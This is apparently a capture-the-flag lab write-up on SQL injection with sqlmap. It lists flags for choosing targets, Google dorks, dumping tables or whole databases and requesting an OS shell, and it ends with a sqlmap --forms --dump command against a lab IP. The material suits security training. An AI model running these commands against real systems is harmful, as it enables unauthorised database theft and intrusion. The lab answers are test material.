# Intro
 
SQL injection is the art of modifying a SQL query so you can get access to the target's database. This technique is often used to get user's data such as passwords, emails etc. SQL injection is one of the most common web vulnerabilities, and as such, it is highly worth checking for

#SqlMap 


- [ ] How do you specify which url to check?

		-u
- [ ] What about which google dork to use?

		-g
- [ ] How do you select(lol) which parameter to use?(Example: in the url http://ex.com?test=1 the parameter would be test.)

		-p
- [ ] What flag sets which database is in the target host's backend?(Example: If the flag is set to mysql then sqlmap will only test mysql injections).
		--dbms

- [ ] How do you select the level of depth sqlmap should use(Higher = more accurate and more tests in general).

		--level
- [ ] How do you dump the table entries of the database?

		--dump

- [ ] Which flag sets which db to enumerate?

		-D
- [ ] Which flag sets which table to enumerate?

		-T
- [ ] Which flag sets which column to enumerate?


		-C
- [ ] How do you ask sqlmap to try to get an interactive os-shell?
		
		--os-shell

- [ ] What flag dumps all data from every table

		--dump-all

#Vulnerable Web Application 

	sqlmap -u http://10.10.124.150/ --forms --dump
	
![sql1](https://user-images.githubusercontent.com/94765997/179359810-fcc9272b-52ab-4eb4-b5e2-d503f5931e0a.png)
